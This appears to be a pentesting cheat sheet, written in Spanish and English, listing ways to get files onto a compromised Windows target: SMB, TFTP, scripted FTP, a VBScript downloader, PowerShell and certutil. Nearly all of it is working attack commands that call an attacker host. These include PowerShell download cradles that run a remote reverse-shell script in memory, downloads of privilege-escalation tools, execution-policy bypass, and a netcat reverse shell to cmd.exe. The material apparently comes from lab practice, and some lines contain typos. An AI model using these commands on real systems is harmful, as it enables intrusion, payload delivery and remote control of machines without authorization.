<h1 id="index"><strong>INDEX</strong></h1>
<hr />

<ol>
  <li>simple webservers</li>
  <li>smbserver</li>
  <li>tftp</li>
  <li>ftp</li>
  <li>SCP</li>
  <li>VBScript</li>
  <li>powershell</li>
  <li>upgrade cmd to powershell</li>
</ol>

<h1 id="0-simple-webserver"><strong>0 simple webserver</strong></h1>
<hr />
<h3 id="--python-27">|  python 2.7</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 -m SimpleHTTPServer
</code></pre></div></div>
<h3 id="--python3">|  python3</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server
</code></pre></div></div>
<h3 id="--ruby">|  ruby</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start"
</code></pre></div></div>
<h3 id="--php">|  php</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -S 0.0.0.0:8888
</code></pre></div></div>

<p> </p>
<h1 id="1-smbsever-impacket"><strong>1 Smbsever (impacket)</strong></h1>
<hr />
<p>impacket-smbserver <share name=""> <path></path></share></p>

<h3 id="--kali">|  <strong>kali:</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py  myshare /tmp/smbshare -smb2
</code></pre></div></div>
<h3 id="--windows">|  <strong>windows:</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use M: \\&lt;kali-ip&gt;\myshare
</code></pre></div></div>
<h3 id="--tmb-se-puede-correr-desde-smb">|  <strong>Tmb se puede correr desde smb</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.10.10.1\privesc.exe  whoami
</code></pre></div></div>

<p> </p>
<h1 id="2-tftp"><strong>2 TFTP</strong></h1>
<hr />
<p>Not the ideal file protocol, pero puede estar y lo podemos llegar a usar</p>

<h3 id="hacker"><strong>hacker</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rootkali: mkdir /tftp
root@kali: atftpd --daemon --port 69 \tftp\
root@kali: cp nc.exe \tftp
</code></pre></div></div>
<h3 id="-target">| <strong>target</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:ProgramFiles\SLmail\System&gt; tftp -i 192.168.30.5 GET nc.exe
</code></pre></div></div>

<p> </p>
<h1 id="3-ftp"><strong>3 FTP</strong></h1>
<hr />
<p>es interactivo el de windows, asi que no vamos a poder, pero el server ftp de windwos nos deja usar scripts :D</p>

<h3 id="-hacker">| <strong>hacker</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali: apt-get install pure-ftpd
root@kali: cat setup-ftp
root@kali: ./setup-ftp
</code></pre></div></div>

<p>comands a poner en el archivo:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali: cat ftp.commands
echo open 192.168.58.5 21 &gt; ftp.txt
echo offsec&gt;&gt; ftp.txt
echo lab&gt;&gt; ftp.txt
echo bin&gt;&gt; ftp.txt
echo GET evil.exe &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt
ftp -s:ftp.txt
</code></pre></div></div>

<h3 id="-target-1">| <strong>target</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\programs files\slmail\System&gt;  cop pyasteamos lo que esta aca arriba y deberia ejecutar todo
</code></pre></div></div>
<p> </p>
<h1 id="4-scp"><strong>4 SCP</strong></h1>
<hr />
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp &lt;fileToUpload&gt; user@remote:/path
</code></pre></div></div>
<p> </p>
<h1 id="5-vbscript"><strong>5 VBScript</strong></h1>
<hr />

<p>para windows mas viejos</p>

<h3 id="--script">|  <strong>script</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
  echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs

  echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
  echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
  echo Err.Clear &gt;&gt; wget.vbs

  echo Set http = Nothing &gt;&gt; wget.vbs
  echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs
  echo If http is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs
  echo If http is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs

  echo If http is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs
  echo http.Open "GET", strUrl, False &gt;&gt; wget.vbs
  echo http.Send &gt;&gt; wget.vbs

  echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
  echo Set  http = Nothing &gt;&gt; wget.vbs
  echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs
  echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs

  echo strData = "" &gt;&gt; wget.vbs
  echo strBuffer = "" &gt;&gt; wget.vbs
  echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs

  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
  echo Next &gt;&gt; wget.vbs
  echo ts.Close &gt;&gt; wget.vbs
</code></pre></div></div>

<h3 id="-target-2">| <strong>target</strong></h3>
<p>copy pasteamos el script</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\program&gt;   dir wget.vbs &lt; para ver que se bajo
C:\program&gt; cscript wget.vbs http://192.168.30.5/exploit.exe exploit.exe
</code></pre></div></div>

<p> </p>
<h1 id="6-powershell"><strong>6 PowerShell</strong></h1>
<hr />

<h3 id="-download-file-to-path">| <strong>Download File to path</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.14.5/JuicyPotato.exe','C:\users\merlin\documents\potato.exe')"
</code></pre></div></div>
<h3 id="-desde-url-en-el-browser">| <strong>desde url en el browser:</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.3:8000/loli.txt','C:\Users\pelado\Desktop\loli.txt') | powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
</code></pre></div></div>

<h3 id="-download--testfile-and-executes-it-in-the-memory">| <strong>Download  testfile and executes it in the memory</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe  -nop -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1')"
</code></pre></div></div>

<h3 id="powershell-full-path">|<strong>powershell full path:</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe
</code></pre></div></div>

<h3 id="-powershell-wget">| <strong>powershell wget</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell wget "http://10.10.10.10/nc.exe" -outfile "nc.exe"
nc.exe -e cmd.exe 10.10.10.10 4444
</code></pre></div></div>

<h2 id="wgetpsl">wget.psl</h2>
<h3 id="-kali">| <strong>kali</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  echo $storageDir = $pwd &gt; wget.psl
  echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.psl
  echo $url = "http://10.10.14.23:8000/PowerUp.ps1 &gt;&gt; wget.psl
  echo $file = "new-exploit.exe" &gt;&gt;wget.psl
  echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.psl
</code></pre></div></div>

<h3 id="-target-3">| <strong>target:</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\programs&gt; copy y pasteo lo de arriba\\
C:\programs&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.psl \\
C:\programs&gt; dir new-exploit.exe\\
 cool\\
</code></pre></div></div>
<p> </p>
<h1 id="7-certutils"><strong>7 certutils</strong></h1>
<hr />
<h3 id="-windows">| <strong>windows</strong></h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -urlcache -split -f "http://ip-addr:port/file" [output-file]
</code></pre></div></div>
